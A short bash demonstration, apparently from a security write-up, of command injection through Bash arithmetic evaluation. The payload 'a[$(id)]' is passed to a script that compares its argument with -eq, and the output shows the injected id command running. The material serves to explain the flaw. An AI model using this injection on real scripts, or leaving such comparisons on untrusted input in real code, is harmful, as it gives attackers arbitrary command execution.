#! /bin/bash

vuln.sh 100
#OK
bash vuln.sh 101
#NG

# because -eq triggers Bash arithmetic evaluation, and Bash arithmetic evaluates array subscript expressions (including command substitutions within them), it runs arbitrary commands:
bash vuln.sh 'a[$(id)]'

# vuln.sh: line 5: uid=1000(oxdf) gid=1000(oxdf) groups=1000(oxdf),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),117(lpadmin),984(docker),987(vboxsf): syntax error in expression (error token is "(oxdf) gid=1000(oxdf) groups=1000(oxdf),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),117(lpadmin),984(docker),987(vboxsf)")

